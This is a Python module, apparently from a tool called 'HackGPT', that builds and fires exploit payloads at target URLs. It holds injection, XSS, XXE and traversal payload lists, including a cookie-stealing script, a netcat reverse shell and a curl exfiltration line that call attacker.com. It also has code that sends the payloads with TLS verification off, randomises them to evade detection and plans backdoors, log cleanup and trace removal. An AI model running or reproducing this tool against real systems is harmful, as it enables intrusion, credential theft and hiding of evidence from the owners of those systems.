#!/usr/bin/env python3
"""
Advanced Exploitation Engine for HackGPT
Custom payload generation and advanced exploitation techniques
"""

import os
import re
import json
import base64
import random
import string
import hashlib
import logging
import subprocess
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
import requests
import socket
import struct
import time

@dataclass
class ExploitPayload:
    name: str
    payload_type: str
    payload_data: str
    target_service: str
    description: str
    severity: str
    success_indicators: List[str]

@dataclass
class ExploitResult:
    success: bool
    payload_used: str
    response_data: str
    execution_time: float
    error_message: Optional[str]
    artifacts: List[str]

class CustomPayloadGenerator:
    """Generates custom payloads based on target characteristics"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.payload_templates = self._load_payload_templates()
    
    def _load_payload_templates(self) -> Dict[str, List[str]]:
        """Load payload templates for different vulnerability types"""
        return {
            'sql_injection': [
                "' OR '1'='1' --",
                "' UNION SELECT user(), database(), version() --",
                "'; EXEC xp_cmdshell('{}'); --",
                "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --",
                "' OR 1=1 LIMIT 1 OFFSET {} --"
            ],
            'nosql_injection': [
                "'; return true; var a='",
                "' || '1'=='1",
                "{\"$where\": \"function(){return true}\"}",
                "{\"$regex\": \".*\"}",
                "'; var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();//"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "'\"><script>alert('XSS')</script>"
            ],
            'xss_advanced': [
                "<script>fetch('/admin',{method:'POST',body:'action=delete&id=1'})</script>",
                "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
                "<script>var xhr=new XMLHttpRequest();xhr.open('GET','/api/sensitive');xhr.send();</script>"
            ],
            'command_injection': [
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "; ls -la /",
                "| curl http://attacker.com/$(whoami)",
                "; nc -e /bin/sh attacker.com 4444"
            ],
            'directory_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ],
            'ldap_injection': [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*))(|(objectclass=*",
                "admin)(|(password=password"
            ],
            'xml_injection': [
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><test>&xxe;</test>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]>",
            ],
            'template_injection': [
                "{{7*7}}",
                "${7*7}",
                "{{config.items()}}",
                "${java.lang.Runtime.getRuntime().exec('id')}",
                "{{request.application.__globals__.__builtins__.__import__('os').system('id')}}"
            ]
        }
    
    def create_payloads(self, vulnerability: Dict[str, Any], target_info: Dict[str, Any]) -> List[ExploitPayload]:
        """Create custom payloads for a specific vulnerability"""
        vuln_type = vulnerability.get('type', '').lower()
        target_os = target_info.get('os', 'unknown').lower()
        target_service = vulnerability.get('service', 'unknown')
        
        payloads = []
        
        # Get base templates
        templates = self.payload_templates.get(vuln_type, [])
        
        for i, template in enumerate(templates):
            # Customize payload based on target
            customized_payload = self._customize_payload(template, target_info, vulnerability)
            
            payload = ExploitPayload(
                name=f"{vuln_type}_payload_{i+1}",
                payload_type=vuln_type,
                payload_data=customized_payload,
                target_service=target_service,
                description=f"Custom {vuln_type} payload for {target_service}",
                severity=vulnerability.get('severity', 'medium'),
                success_indicators=self._get_success_indicators(vuln_type, target_os)
            )
            payloads.append(payload)
        
        # Add OS-specific payloads
        os_specific_payloads = self._generate_os_specific_payloads(vuln_type, target_os)
        payloads.extend(os_specific_payloads)
        
        # Add service-specific payloads
        service_specific_payloads = self._generate_service_specific_payloads(vuln_type, target_service)
        payloads.extend(service_specific_payloads)
        
        return payloads
    
    def _customize_payload(self, template: str, target_info: Dict[str, Any], vulnerability: Dict[str, Any]) -> str:
        """Customize payload template based on target characteristics"""
        payload = template
        
        # Replace placeholders
        if '{}' in payload:
            # For command injection, use OS-appropriate commands
            target_os = target_info.get('os', 'linux').lower()
            if 'windows' in target_os:
                payload = payload.format('whoami')
            else:
                payload = payload.format('id')
        
        # Add randomization to evade detection
        if 'alert(' in payload:
            random_string = ''.join(random.choices(string.ascii_letters, k=8))
            payload = payload.replace("alert('XSS')", f"alert('{random_string}')")
        
        # URL encode if needed
        if vulnerability.get('requires_encoding', False):
            payload = requests.utils.quote(payload)
        
        return payload
    
    def _generate_os_specific_payloads(self, vuln_type: str, target_os: str) -> List[ExploitPayload]:
        """Generate OS-specific payloads"""
        payloads = []
        
        if vuln_type == 'command_injection':
            if 'windows' in target_os:
                windows_payloads = [
                    "; dir C:\\",
                    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "| powershell -c Get-Process",
                    "; net user /domain",
                    "& whoami /all"
                ]
                for i, payload_data in enumerate(windows_payloads):
                    payloads.append(ExploitPayload(
                        name=f"windows_cmd_injection_{i+1}",
                        payload_type=vuln_type,
                        payload_data=payload_data,
                        target_service="command_execution",
                        description=f"Windows-specific command injection payload",
                        severity="high",
                        success_indicators=["C:\\", "Windows", "Administrator", "Domain"]
                    ))
            else:
                linux_payloads = [
                    "; uname -a",
                    "| ps aux",
                    "&& cat /proc/version",
                    "; find / -name '*.conf' 2>/dev/null",
                    "| netstat -tulpn"
                ]
                for i, payload_data in enumerate(linux_payloads):
                    payloads.append(ExploitPayload(
                        name=f"linux_cmd_injection_{i+1}",
                        payload_type=vuln_type,
                        payload_data=payload_data,
                        target_service="command_execution",
                        description=f"Linux-specific command injection payload",
                        severity="high",
                        success_indicators=["Linux", "GNU", "root", "bin/bash"]
                    ))
        
        return payloads
    
    def _generate_service_specific_payloads(self, vuln_type: str, target_service: str) -> List[ExploitPayload]:
        """Generate service-specific payloads"""
        payloads = []
        
        if 'mysql' in target_service.lower() and vuln_type == 'sql_injection':
            mysql_payloads = [
                "' UNION SELECT user(), current_user(), version(), @@hostname --",
                "'; SELECT * FROM mysql.user WHERE user='root' --",
                "' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL --",
                "'; SELECT password FROM mysql.user WHERE user='root' --"
            ]
            for i, payload_data in enumerate(mysql_payloads):
                payloads.append(ExploitPayload(
                    name=f"mysql_injection_{i+1}",
                    payload_type=vuln_type,
                    payload_data=payload_data,
                    target_service=target_service,
                    description="MySQL-specific SQL injection payload",
                    severity="high",
                    success_indicators=["mysql", "root@", "version()"]
                ))
        
        elif 'postgresql' in target_service.lower() and vuln_type == 'sql_injection':
            postgres_payloads = [
                "' UNION SELECT current_user, version(), current_database() --",
                "'; SELECT * FROM pg_user --",
                "' UNION SELECT pg_read_file('/etc/passwd'), NULL --"
            ]
            for i, payload_data in enumerate(postgres_payloads):
                payloads.append(ExploitPayload(
                    name=f"postgres_injection_{i+1}",
                    payload_type=vuln_type,
                    payload_data=payload_data,
                    target_service=target_service,
                    description="PostgreSQL-specific SQL injection payload",
                    severity="high",
                    success_indicators=["PostgreSQL", "postgres", "pg_"]
                ))
        
        return payloads
    
    def _get_success_indicators(self, vuln_type: str, target_os: str) -> List[str]:
        """Get success indicators for payload type"""
        indicators = {
            'sql_injection': ["error", "mysql", "syntax", "database", "version", "user"],
            'xss': ["<script", "alert", "javascript:", "onerror"],
            'command_injection': ["uid=", "gid=", "root", "admin", "/bin", "C:\\"],
            'directory_traversal': ["root:", "admin:", "[users]", "/etc/passwd"],
            'ldap_injection': ["ldap", "cn=", "ou=", "dc="]
        }
        
        base_indicators = indicators.get(vuln_type, ["success", "error"])
        
        # Add OS-specific indicators
        if 'windows' in target_os:
            base_indicators.extend(["Windows", "Administrator", "C:\\"])
        else:
            base_indicators.extend(["Linux", "root", "bin/bash"])
        
        return base_indicators

class AdvancedExploitationEngine:
    """Advanced exploitation engine with custom techniques"""
    
    def __init__(self):
        self.payload_generator = CustomPayloadGenerator()
        self.logger = logging.getLogger(__name__)
        self.exploit_history = []
        
    def generate_custom_exploits(self, vulnerabilities: List[Dict[str, Any]], 
                                target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate custom exploits for vulnerabilities"""
        custom_exploits = []
        
        for vuln in vulnerabilities:
            # Generate payloads for vulnerability
            payloads = self.payload_generator.create_payloads(vuln, target_info)
            
            # Create exploitation chains
            chains = self._build_exploitation_chain(vuln, payloads, target_info)
            
            for chain in chains:
                exploit = {
                    'id': hashlib.md5(f"{vuln.get('id', '')}{chain['name']}".encode()).hexdigest()[:8],
                    'vulnerability_id': vuln.get('id'),
                    'name': chain['name'],
                    'type': chain['type'],
                    'payloads': chain['payloads'],
                    'steps': chain['steps'],
                    'success_probability': chain['success_probability'],
                    'impact_level': chain['impact_level'],
                    'difficulty': chain['difficulty'],
                    'requirements': chain['requirements'],
                    'post_exploit_actions': chain.get('post_exploit_actions', [])
                }
                custom_exploits.append(exploit)
        
        # Prioritize exploits
        prioritized_exploits = self._prioritize_exploits(custom_exploits)
        
        return prioritized_exploits
    
    def _build_exploitation_chain(self, vulnerability: Dict[str, Any], 
                                 payloads: List[ExploitPayload],
                                 target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Build exploitation chains for vulnerability"""
        chains = []
        vuln_type = vulnerability.get('type', '').lower()
        severity = vulnerability.get('severity', 'medium').lower()
        
        # Basic exploitation chain
        basic_chain = {
            'name': f"Direct {vuln_type} exploitation",
            'type': 'direct',
            'payloads': payloads[:3],  # Use top 3 payloads
            'steps': [
                {'step': 1, 'action': 'Identify vulnerable parameter', 'method': 'analysis'},
                {'step': 2, 'action': 'Craft exploitation payload', 'method': 'custom_payload'},
                {'step': 3, 'action': 'Execute payload', 'method': 'http_request'},
                {'step': 4, 'action': 'Verify exploitation success', 'method': 'response_analysis'}
            ],
            'success_probability': self._calculate_success_probability(vuln_type, severity),
            'impact_level': severity,
            'difficulty': 'medium' if severity in ['high', 'critical'] else 'low',
            'requirements': ['network_access', 'valid_target']
        }
        chains.append(basic_chain)
        
        # Advanced exploitation chain (for high/critical vulns)
        if severity in ['high', 'critical']:
            advanced_chain = {
                'name': f"Advanced {vuln_type} with persistence",
                'type': 'advanced',
                'payloads': payloads,
                'steps': [
                    {'step': 1, 'action': 'Initial vulnerability exploitation', 'method': 'payload_execution'},
                    {'step': 2, 'action': 'Establish command execution', 'method': 'shell_upload'},
                    {'step': 3, 'action': 'Enumerate system information', 'method': 'system_enum'},
                    {'step': 4, 'action': 'Escalate privileges', 'method': 'priv_esc'},
                    {'step': 5, 'action': 'Establish persistence', 'method': 'backdoor_install'},
                    {'step': 6, 'action': 'Cover tracks', 'method': 'log_cleanup'}
                ],
                'success_probability': self._calculate_success_probability(vuln_type, severity) * 0.7,
                'impact_level': 'critical',
                'difficulty': 'high',
                'requirements': ['network_access', 'valid_target', 'writable_directory'],
                'post_exploit_actions': [
                    'system_enumeration',
                    'privilege_escalation',
                    'lateral_movement',
                    'data_exfiltration'
                ]
            }
            chains.append(advanced_chain)
        
        # Stealth exploitation chain
        stealth_chain = {
            'name': f"Stealth {vuln_type} exploitation",
            'type': 'stealth',
            'payloads': [p for p in payloads if 'advanced' in p.name or len(p.payload_data) < 100],
            'steps': [
                {'step': 1, 'action': 'Passive reconnaissance', 'method': 'information_gathering'},
                {'step': 2, 'action': 'Minimal payload testing', 'method': 'subtle_probing'},
                {'step': 3, 'action': 'Execute stealth payload', 'method': 'encoded_request'},
                {'step': 4, 'action': 'Verify with minimal footprint', 'method': 'passive_verification'},
                {'step': 5, 'action': 'Clean up evidence', 'method': 'trace_removal'}
            ],
            'success_probability': self._calculate_success_probability(vuln_type, severity) * 0.8,
            'impact_level': severity,
            'difficulty': 'high',
            'requirements': ['network_access', 'stealth_tools']
        }
        chains.append(stealth_chain)
        
        return chains
    
    def _calculate_success_probability(self, vuln_type: str, severity: str) -> float:
        """Calculate exploitation success probability"""
        # Base probability by vulnerability type
        base_probabilities = {
            'sql_injection': 0.85,
            'xss': 0.90,
            'command_injection': 0.80,
            'directory_traversal': 0.75,
            'file_upload': 0.70,
            'authentication_bypass': 0.65,
            'privilege_escalation': 0.60,
            'buffer_overflow': 0.45,
            'race_condition': 0.40
        }
        
        base_prob = base_probabilities.get(vuln_type, 0.50)
        
        # Adjust by severity
        severity_multipliers = {
            'critical': 1.2,
            'high': 1.1,
            'medium': 1.0,
            'low': 0.8,
            'info': 0.3
        }
        
        multiplier = severity_multipliers.get(severity, 1.0)
        
        # Cap at 0.95 (nothing is 100% certain)
        return min(base_prob * multiplier, 0.95)
    
    def _prioritize_exploits(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Prioritize exploits based on multiple factors"""
        def calculate_priority_score(exploit):
            # Factors: success probability, impact level, difficulty (inverse)
            success_weight = exploit['success_probability'] * 40
            
            impact_weights = {'critical': 40, 'high': 30, 'medium': 20, 'low': 10, 'info': 5}
            impact_weight = impact_weights.get(exploit['impact_level'], 10)
            
            difficulty_weights = {'low': 20, 'medium': 10, 'high': 5}
            difficulty_weight = difficulty_weights.get(exploit['difficulty'], 10)
            
            return success_weight + impact_weight + difficulty_weight
        
        # Calculate priority scores
        for exploit in exploits:
            exploit['priority_score'] = calculate_priority_score(exploit)
        
        # Sort by priority score (highest first)
        return sorted(exploits, key=lambda x: x['priority_score'], reverse=True)
    
    def execute_exploit(self, exploit: Dict[str, Any], target_url: str, 
                       parameters: Dict[str, str] = None) -> ExploitResult:
        """Execute an exploit against a target"""
        self.logger.info(f"Executing exploit: {exploit['name']}")
        
        start_time = time.time()
        results = []
        
        try:
            for payload in exploit['payloads'][:3]:  # Try top 3 payloads
                result = self._execute_payload(payload, target_url, parameters)
                results.append(result)
                
                if result.success:
                    execution_time = time.time() - start_time
                    
                    # Log successful exploitation
                    self.exploit_history.append({
                        'timestamp': datetime.utcnow().isoformat(),
                        'exploit': exploit['name'],
                        'target': target_url,
                        'payload': payload.name,
                        'success': True
                    })
                    
                    return ExploitResult(
                        success=True,
                        payload_used=payload.name,
                        response_data=result.response_data,
                        execution_time=execution_time,
                        error_message=None,
                        artifacts=result.artifacts
                    )
            
            # If no payload succeeded
            execution_time = time.time() - start_time
            error_messages = [r.error_message for r in results if r.error_message]
            
            return ExploitResult(
                success=False,
                payload_used="multiple",
                response_data="",
                execution_time=execution_time,
                error_message="; ".join(error_messages),
                artifacts=[]
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            self.logger.error(f"Exploit execution error: {e}")
            
            return ExploitResult(
                success=False,
                payload_used="unknown",
                response_data="",
                execution_time=execution_time,
                error_message=str(e),
                artifacts=[]
            )
    
    def _execute_payload(self, payload: ExploitPayload, target_url: str, 
                        parameters: Dict[str, str] = None) -> ExploitResult:
        """Execute a single payload"""
        try:
            if payload.payload_type in ['sql_injection', 'xss', 'command_injection']:
                return self._execute_web_payload(payload, target_url, parameters)
            elif payload.payload_type in ['buffer_overflow', 'format_string']:
                return self._execute_binary_payload(payload, target_url)
            else:
                return self._execute_generic_payload(payload, target_url, parameters)
                
        except Exception as e:
            return ExploitResult(
                success=False,
                payload_used=payload.name,
                response_data="",
                execution_time=0,
                error_message=str(e),
                artifacts=[]
            )
    
    def _execute_web_payload(self, payload: ExploitPayload, target_url: str, 
                           parameters: Dict[str, str] = None) -> ExploitResult:
        """Execute web-based payload"""
        try:
            # Prepare request parameters
            params = parameters or {}
            
            # Inject payload into vulnerable parameter
            if 'vulnerable_param' in params:
                params[params['vulnerable_param']] = payload.payload_data
            else:
                # Try common parameter names
                common_params = ['id', 'search', 'query', 'input', 'data', 'value']
                for param in common_params:
                    if param in params:
                        params[param] = payload.payload_data
                        break
                else:
                    # Default parameter
                    params['test'] = payload.payload_data
            
            # Send request
            response = requests.get(target_url, params=params, timeout=10, verify=False)
            
            # Check for success indicators
            success = self._check_success_indicators(response.text, payload.success_indicators)
            
            artifacts = []
            if success:
                artifacts = self._extract_artifacts(response.text, payload.payload_type)
            
            return ExploitResult(
                success=success,
                payload_used=payload.name,
                response_data=response.text[:1000],  # Limit response size
                execution_time=response.elapsed.total_seconds(),
                error_message=None if success else "No success indicators found",
                artifacts=artifacts
            )
            
        except requests.RequestException as e:
            return ExploitResult(
                success=False,
                payload_used=payload.name,
                response_data="",
                execution_time=0,
                error_message=f"Request error: {str(e)}",
                artifacts=[]
            )
    
    def _execute_binary_payload(self, payload: ExploitPayload, target_url: str) -> ExploitResult:
        """Execute binary exploitation payload"""
        # This is a simplified implementation - real binary exploitation is much more complex
        try:
            # Parse target (host:port)
            if '://' in target_url:
                target_url = target_url.split('://', 1)[1]
            
            if ':' in target_url:
                host, port = target_url.rsplit(':', 1)
                port = int(port)
            else:
                host, port = target_url, 80
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            
            # Send payload
            sock.send(payload.payload_data.encode())
            
            # Receive response
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            # Check for success indicators
            success = self._check_success_indicators(response, payload.success_indicators)
            
            return ExploitResult(
                success=success,
                payload_used=payload.name,
                response_data=response,
                execution_time=1.0,  # Approximate
                error_message=None if success else "Binary exploitation failed",
                artifacts=[]
            )
            
        except Exception as e:
            return ExploitResult(
                success=False,
                payload_used=payload.name,
                response_data="",
                execution_time=0,
                error_message=f"Binary exploitation error: {str(e)}",
                artifacts=[]
            )
    
    def _execute_generic_payload(self, payload: ExploitPayload, target_url: str, 
                               parameters: Dict[str, str] = None) -> ExploitResult:
        """Execute generic payload"""
        # Fallback to web payload execution
        return self._execute_web_payload(payload, target_url, parameters)
    
    def _check_success_indicators(self, response: str, indicators: List[str]) -> bool:
        """Check if response contains success indicators"""
        response_lower = response.lower()
        
        # Look for any success indicator
        for indicator in indicators:
            if indicator.lower() in response_lower:
                return True
        
        return False
    
    def _extract_artifacts(self, response: str, payload_type: str) -> List[str]:
        """Extract useful artifacts from successful exploitation"""
        artifacts = []
        
        if payload_type == 'sql_injection':
            # Extract database information
            db_patterns = [
                r'mysql.*?version.*?(\d+\.\d+\.\d+)',
                r'postgresql.*?(\d+\.\d+)',
                r'version\(\).*?(\d+\.\d+\.\d+)',
                r'user\(\).*?(\w+@\w+)'
            ]
            for pattern in db_patterns:
                matches = re.findall(pattern, response, re.IGNORECASE)
                artifacts.extend(matches)
        
        elif payload_type == 'command_injection':
            # Extract system information
            system_patterns = [
                r'uid=(\d+\(\w+\))',
                r'gid=(\d+\(\w+\))',
                r'Linux.*?(\d+\.\d+\.\d+)',
                r'Windows.*?([\d\.]+)'
            ]
            for pattern in system_patterns:
                matches = re.findall(pattern, response, re.IGNORECASE)
                artifacts.extend(matches)
        
        elif payload_type == 'directory_traversal':
            # Extract file contents
            file_patterns = [
                r'root:.*?:.*?:.*?:/root:/bin/bash',
                r'\[users\]',
                r'Administrator:.*?:.*?:'
            ]
            for pattern in file_patterns:
                matches = re.findall(pattern, response, re.IGNORECASE)
                artifacts.extend(matches)
        
        return artifacts[:10]  # Limit artifacts
    
    def get_exploitation_report(self) -> Dict[str, Any]:
        """Get exploitation activity report"""
        successful_exploits = [h for h in self.exploit_history if h['success']]
        
        return {
            'total_attempts': len(self.exploit_history),
            'successful_exploits': len(successful_exploits),
            'success_rate': len(successful_exploits) / len(self.exploit_history) if self.exploit_history else 0,
            'exploit_types': list(set(h['exploit'] for h in self.exploit_history)),
            'targets_exploited': list(set(h['target'] for h in successful_exploits)),
            'recent_activity': self.exploit_history[-10:]  # Last 10 attempts
        }
